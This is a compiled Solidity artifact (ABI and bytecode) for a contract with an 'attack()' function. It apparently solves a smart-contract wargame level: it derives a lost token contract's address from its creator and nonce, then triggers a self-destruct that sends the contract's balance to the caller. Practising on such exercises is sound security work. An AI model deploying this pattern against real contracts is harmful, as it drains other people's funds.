{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"calculateTokenAddress","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"nonce","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"pure"}],"bytecode":{"object":"0x60a0604052348015600e575f5ffd5b506040516103a33803806103a3833981016040819052602b91603b565b6001600160a01b03166080526066565b5f60208284031215604a575f5ffd5b81516001600160a01b0381168114605f575f5ffd5b9392505050565b60805161031e6100855f395f818161011f015261019d015261031e5ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c8063993e3d62146100385780639e5faafc146100d7575b5f5ffd5b6100ae6100463660046102a6565b6040805160609390931b6bffffffffffffffffffffffff191660208085019190915260c09290921b7fffffffffffffffff0000000000000000000000000000000000000000000000001660348401528051808403601c018152603c9093019052815191012090565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b6100df6100e1565b005b604080517f3894e51600000000000000000000000000000000000000000000000000000000815260048101919091525f6044820152600160248201527f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1690633894e516906064015f604051808303815f87803b158015610175575f5ffd5b505af1158015610187573d5f5f3e3d5ffd5b5050604080516bffffffffffffffffffffffff197f000000000000000000000000000000000000000000000000000000000000000060601b166020808301829052780100000000000000000000000000000000000000000000000060348401528351601c818503018152603c84018552805190820120605c8401929092525f607084018190528451605881860301815260788501808752815191909301207ef55d9d0000000000000000000000000000000000000000000000000000000090925233607c850152935191955073ffffffffffffffffffffffffffffffffffffffff16935062f55d9d92609c8084019391929182900301818387803b15801561028d575f5ffd5b505af115801561029f573d5f5f3e3d5ffd5b5050505050565b5f5f604083850312156102b7575f5ffd5b823573ffffffffffffffffffffffffffffffffffffffff811681146102da575f5ffd5b94602093909301359350505056fea2646970667358221220065fac18693ade46b362517273259124de064bbfcbac7904da9bb0a1ef6af95264736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","calculateTokenAddress(address,uint256)":"993e3d62"},"id":0}